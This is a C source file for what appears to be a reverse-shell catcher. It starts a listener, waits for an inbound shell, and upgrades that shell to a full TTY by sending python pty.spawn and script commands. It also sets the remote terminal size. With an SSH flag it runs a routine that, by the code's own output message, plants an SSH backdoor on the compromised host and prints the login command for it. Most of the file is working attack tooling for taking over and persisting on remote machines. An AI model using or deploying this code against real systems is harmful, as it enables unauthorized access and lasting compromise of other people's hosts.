#include "term.c"

#define SPAWN_CMD \
    "python3 -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null" \
    " || python2 -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null" \
    " || python  -c \"import pty; pty.spawn('/bin/bash')\" 2>/dev/null" \
    " || script -qc /bin/bash /dev/null; exit\n"

static void send_cmd(int fd, const char *s) {
    write(fd, s, strlen(s));
}

static int drain_until_idle(int fd_recv, int idle_ms, int max_ms, int show) {
    char buf[4096];
    int n;
    fd_set fds;
    struct timeval tv, start, now;
    int got_any = 0;

    gettimeofday(&start, NULL);

    for (;;) {
        tv.tv_sec  =  idle_ms / 1000;
        tv.tv_usec = (idle_ms % 1000) * 1000;
        FD_ZERO(&fds);
        FD_SET(fd_recv, &fds);

        int ret = select(fd_recv + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) { if (errno == EINTR) continue; break; }
        if (ret == 0) break;

        n = read(fd_recv, buf, sizeof(buf));
        if (n <= 0) break;
        got_any = 1;
        if (show) write(STDOUT_FILENO, buf, n);

        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec  - start.tv_sec)  * 1000
                     + (now.tv_usec - start.tv_usec) / 1000;
        if (elapsed >= max_ms) break;
    }
    return got_any;
}

#include "ssh_upgrade.c"

void start_session(char *listener_argv[], int listener_argc, char ssh_flag) {
    term_save();
    atexit(term_restore);
    term_install_safety();
    signal(SIGCHLD, SIG_IGN);

    int pipe_to_listener[2];
    int pipe_from_listener[2];

    if (pipe(pipe_to_listener)   < 0) { perror("pipe"); return; }
    if (pipe(pipe_from_listener) < 0) { perror("pipe"); return; }

    int pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {
        close(pipe_to_listener[1]);
        close(pipe_from_listener[0]);

        dup2(pipe_to_listener[0],   STDIN_FILENO);
        dup2(pipe_from_listener[1], STDOUT_FILENO);
        dup2(pipe_from_listener[1], STDERR_FILENO);

        close(pipe_to_listener[0]);
        close(pipe_from_listener[1]);

        execvp(listener_argv[0], listener_argv);
        perror("execvp");
        _exit(127);
    }

    close(pipe_to_listener[0]);
    close(pipe_from_listener[1]);

    int fd_send = pipe_to_listener[1];
    int fd_recv = pipe_from_listener[0];

    (void)listener_argc;

    char buf[4096];
    int  n;

    usleep(300000);
    drain_until_idle(fd_recv, 400, 3000, 0);

    fprintf(stderr, "  " C_YLW "[+] waiting for connection..\n" C_RST);

    n = read(fd_recv, buf, sizeof(buf));
    if (n <= 0) { fprintf(stderr, "[-] listener died\n"); return; }
    drain_until_idle(fd_recv, 300, 2000, 0);

    fprintf(stderr, "  " C_YLW "[+] Inbound connection captured!\n" C_RST);

    term_raw();
    write(STDOUT_FILENO, "\r", 1);

    send_cmd(fd_send, SPAWN_CMD);
    drain_until_idle(fd_recv, 500, 5000, 0);

    int rows, cols;
    term_get_size(&rows, &cols);
    char setup[256];
    snprintf(setup, sizeof(setup),
        "export TERM=xterm; stty rows %d cols %d\n", rows, cols);
    send_cmd(fd_send, setup);
    drain_until_idle(fd_recv, 400, 2000, 0);

    char ssh_priv[512] = {0}, ssh_pub[512] = {0};
    char ssh_user[64]  = {0};
    char remote_ip[64] = {0};

    if (ssh_flag) {
        if (rsi_ensure_key(ssh_priv, sizeof ssh_priv, ssh_pub, sizeof ssh_pub)) {
            do_ssh_upgrade(fd_send, fd_recv,
                           ssh_priv, ssh_pub,
                           remote_ip, sizeof remote_ip,
                           ssh_user,  sizeof ssh_user);
            if (remote_ip[0] && ssh_user[0]) {
                fprintf(stderr,
                    "  " C_YLW "[+]" C_RST
                    " SSH backdoor planted\r\n"
                    "  " C_YLW "[+]" C_RST
                    " ssh -i ./id_rsa %s@%s\r\n\r\n",
                    ssh_user, remote_ip);
            }
        }
        drain_until_idle(fd_recv, 300, 1000, 0);
    }

    send_cmd(fd_send, "\n");
    drain_until_idle(fd_recv, 400, 2000, 1);

    fd_set fds;
    for (;;) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(fd_recv, &fds);

        int maxfd = fd_recv > STDIN_FILENO ? fd_recv : STDIN_FILENO;

        int ret = select(maxfd + 1, &fds, NULL, NULL, NULL);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0) {
                write(STDOUT_FILENO, "\r\n", 2);
                break;
            }
            write(fd_send, buf, n);
        }

        if (FD_ISSET(fd_recv, &fds)) {
            n = read(fd_recv, buf, sizeof(buf));
            if (n <= 0) {
                write(STDOUT_FILENO, "\r\n", 2);
                break;
            }
            write(STDOUT_FILENO, buf, n);
        }
    }

    term_restore();
}